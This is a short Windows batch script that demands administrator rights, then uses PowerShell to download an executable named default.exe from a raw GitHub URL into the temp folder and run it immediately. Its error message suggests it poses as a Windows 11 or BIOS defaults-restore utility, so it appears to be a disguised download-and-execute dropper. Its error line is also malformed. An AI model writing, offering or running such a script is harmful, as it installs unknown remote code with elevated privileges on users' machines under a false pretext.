@echo off

:: Check if the script is running as administrator
whoami /groups | find "S-1-5-32-544" >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as an administrator.
    echo Right-click this file and select "Run as Administrator."
    pause
    exit /b
)

:: Download and execute the file
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
if exist "%TEMP%\default.exe" (
    start "" "%TEMP%\default.exe"
) else (
    echo Windows 11 | BIOS failed to restore defaults. Try again
)

endlocal
